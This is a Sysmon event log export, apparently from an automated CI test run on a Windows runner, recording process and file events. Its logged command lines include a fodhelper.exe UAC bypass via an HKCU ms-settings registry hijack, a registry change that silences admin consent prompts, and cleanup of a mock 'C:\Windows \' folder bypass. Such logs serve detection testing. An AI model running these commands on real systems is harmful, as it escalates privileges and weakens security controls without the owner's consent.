"TimeCreated","Id","Message"
"12/17/2025 8:03:14 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:14.353
ProcessGuid: {f995aebf-63c2-6942-2b06-000000000e00}
ProcessId: 5384
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gka3vk2p.1en.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:14 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:14.332
ProcessGuid: {f995aebf-63c2-6942-2b06-000000000e00}
ProcessId: 5384
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_gka3vk2p.1en.ps1
CreationUtcTime: 2025-12-17 08:03:14.332
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:14 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:14.267
ProcessGuid: {f995aebf-63c2-6942-2b06-000000000e00}
ProcessId: 5384
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell  Stop-Process -Name cmd -Force -ErrorAction Ignore 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-63c2-6942-2906-000000000e00}
ParentProcessId: 9724
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c powershell Stop-Process -Name cmd -Force -ErrorAction Ignore & powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:14 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:14.243
ProcessGuid: {f995aebf-63c2-6942-2906-000000000e00}
ProcessId: 9724
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c powershell Stop-Process -Name cmd -Force -ErrorAction Ignore & powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:13 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:13.750
ProcessGuid: {f995aebf-63c1-6942-2806-000000000e00}
ProcessId: 956
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wyw3y2js.kd2.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:13 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:13.728
ProcessGuid: {f995aebf-63c1-6942-2806-000000000e00}
ProcessId: 956
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wyw3y2js.kd2.ps1
CreationUtcTime: 2025-12-17 08:03:13.728
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:13.662
ProcessGuid: {f995aebf-63c1-6942-2806-000000000e00}
ProcessId: 956
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: powershell  Stop-Process -Name cmd -Force -ErrorAction Ignore 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-63c1-6942-2606-000000000e00}
ParentProcessId: 3468
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c powershell Stop-Process -Name cmd -Force -ErrorAction Ignore & powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:13.639
ProcessGuid: {f995aebf-63c1-6942-2606-000000000e00}
ProcessId: 3468
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c powershell Stop-Process -Name cmd -Force -ErrorAction Ignore & powershell Stop-Process -Name mmc -Force -ErrorAction Ignore
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:13.433
ProcessGuid: {f995aebf-63c1-6942-2406-000000000e00}
ProcessId: 7008
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:13 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:13.212
ProcessGuid: {f995aebf-63c1-6942-2106-000000000e00}
ProcessId: 9616
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 1 /f
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:12.815
ProcessGuid: {f995aebf-63c0-6942-1f06-000000000e00}
ProcessId: 5932
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nogkf2e5.12x.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:12 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:12.793
ProcessGuid: {f995aebf-63c0-6942-1f06-000000000e00}
ProcessId: 5932
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_nogkf2e5.12x.ps1
CreationUtcTime: 2025-12-17 08:03:12.793
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:12 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:12.709
ProcessGuid: {f995aebf-63c0-6942-1f06-000000000e00}
ProcessId: 5932
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Remove-Item -Path \""""HKCU:\Software\Classes\Folder\"""" -Recurse -Force -ErrorAction Ignore}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:12.501
ProcessGuid: {f995aebf-63c0-6942-1b06-000000000e00}
ProcessId: 9300
User: runnervm8j6r3\runneradmin
Image: C:\Windows\SYSTEM32\cmd.exe
TargetFilename: C:\Windows \System32\mmc.exe
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
IsExecutable: true
Archived: true"
"12/17/2025 8:03:12 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:12.480
ProcessGuid: {f995aebf-63c0-6942-1b06-000000000e00}
ProcessId: 9300
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c rd ""\\?\C:\Windows \"" /S /Q >nul 2>nul & del ""c:\testbypass.exe"" >nul 2>nul
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:12 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:12.095
ProcessGuid: {f995aebf-63bf-6942-1906-000000000e00}
ProcessId: 7220
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hn3zkqmo.lbj.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:12 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:12.074
ProcessGuid: {f995aebf-63bf-6942-1906-000000000e00}
ProcessId: 7220
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_hn3zkqmo.lbj.ps1
CreationUtcTime: 2025-12-17 08:03:12.074
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:11 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:11.992
ProcessGuid: {f995aebf-63bf-6942-1906-000000000e00}
ProcessId: 7220
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Remove-Item \""""HKCU:\software\classes\ms-settings\"""" -force -Recurse -ErrorAction Ignore}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:11 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:11.590
ProcessGuid: {f995aebf-63bf-6942-1706-000000000e00}
ProcessId: 7544
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0rw3nhqd.cnl.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:11 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:11.570
ProcessGuid: {f995aebf-63bf-6942-1706-000000000e00}
ProcessId: 7544
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_0rw3nhqd.cnl.ps1
CreationUtcTime: 2025-12-17 08:03:11.568
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:11 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:11.487
ProcessGuid: {f995aebf-63bf-6942-1706-000000000e00}
ProcessId: 7544
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Remove-Item \""""HKCU:\software\classes\ms-settings\"""" -force -Recurse -ErrorAction Ignore}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:11 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:11.256
ProcessGuid: {f995aebf-63bf-6942-1406-000000000e00}
ProcessId: 5432
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 08:03:10.854
ProcessGuid: {f995aebf-63be-6942-1206-000000000e00}
ProcessId: 5856
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_m05pazfl.lli.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 8:03:10 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 08:03:10.828
ProcessGuid: {f995aebf-63be-6942-1206-000000000e00}
ProcessId: 5856
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_m05pazfl.lli.ps1
CreationUtcTime: 2025-12-17 08:03:10.828
User: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:10.743
ProcessGuid: {f995aebf-63be-6942-1206-000000000e00}
ProcessId: 5856
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {Remove-Item \""""HKCU:\software\classes\mscfile\"""" -force -Recurse -ErrorAction Ignore}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:10.493
ProcessGuid: {f995aebf-63be-6942-0f06-000000000e00}
ProcessId: 2544
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg.exe delete hkcu\software\classes\mscfile /f >nul 2>&1
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:10 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:10.212
ProcessGuid: {f995aebf-63be-6942-0e06-000000000e00}
ProcessId: 9380
Image: C:\Windows\System32\whoami.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: whoami - displays logged on user information
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: whoami.exe
CommandLine: ""C:\Windows\system32\whoami.exe""
CurrentDirectory: D:\a\sysmon\sysmon\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=23240EF9F8B0A9A324110B1C2331DE31DC1B0E08F5359CB707E51A939AF56CD3
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:04 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:04.920
ProcessGuid: {f995aebf-63b8-6942-0b06-000000000e00}
ProcessId: 7984
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Classes\.pwn\Shell\Open\command"" /ve /d ""C:\Windows\System32\calc.exe"" /f &  & reg add ""HKEY_CURRENT_USER\Software\Classes\ms-settings\CurVer"" /ve /d "".pwn"" /f &  & echo Triggering fodhelper.exe for potential privilege escalation... & start fodhelper.exe
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 8:03:04 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 08:03:04.658
ProcessGuid: {f995aebf-63b8-6942-0806-000000000e00}
ProcessId: 7856
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5ae4-6942-0e06-0c0000000000}
LogonId: 0xC060E
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60f4-6942-f302-000000000e00}
ParentProcessId: 8700
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\376a09f4-185e-4c7d-b96b-edbc7a510283.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
